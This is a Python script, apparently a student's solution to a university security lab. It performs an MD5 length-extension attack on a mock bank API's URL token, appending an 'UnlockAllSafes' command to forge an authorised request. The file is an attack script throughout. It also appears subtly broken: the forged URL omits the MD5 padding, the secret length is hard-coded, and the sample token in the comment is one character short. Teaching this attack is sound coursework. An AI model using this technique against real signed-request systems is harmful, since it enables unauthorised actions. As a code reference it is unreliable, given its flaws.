import sys, urllib.parse
from pymd5 import md5, padding
from urllib.parse import urlparse
# Copy this to place when running this program
# "http://bank.cse127.ucsd.edu/pa5/api?token=d6613c382dbb78b592091e08f6f41fe&user=nadiah&command1=ListSquirrels&command2=NoOp"

url = sys.argv[1]
# hash is length 32
# original token is a hash of the password and commands
# update original hash with the command we want to append "&uncommand3=......Safes"
# hash this user=nadiah&command1=ListSquirrels&command2=NoOp || &command3=UnlockAllSafes by updating
# construct new URL
newCmd = "&command3=UnlockAllSafes" 

hostname = url[url.find(urlparse(url).hostname):url.find(urlparse(url).hostname)+len(urlparse(url).hostname)]
#print("hostname: " + hostname)

dir = url[url.find("/pa5/api?"):url.find("/pa5/api?")+9]
#print("path: " + dir)

token = url[url.find("token")+6:url.find("token")+6+32]
#print("token: " + token)
#print("length of token: " + str(len(token)))

user = url[url.find("user")+5:url.find("command1")-1]
#print("user: " + user)

cmd1 = url[url.find("command1")+9:url.find("command2")-1]
#print("command1: " + cmd1)

cmd2 = url[url.find("command2")+9:]
#print("command2: " + cmd2)

command = "&user="+user+"&command1="+cmd1+"&command2="+cmd2+newCmd
#print(command)

#must use the old token somewhere because that contains the password hashed into the command
oldCmd = "user="+user+"&command1="+cmd1+"&command2="+cmd2
newToken = md5(state=bytes.fromhex(token), count=512)
newToken.update(newCmd)
#print(newToken.hexdigest())
#newToken = md5(oldCmd.encode("utf-8") + padding(len(oldCmd)*8) + newCmd.encode("utf-8")).hexdigest()
new_url = "http://"+hostname+dir+"token="+newToken.hexdigest()+command
print(new_url)
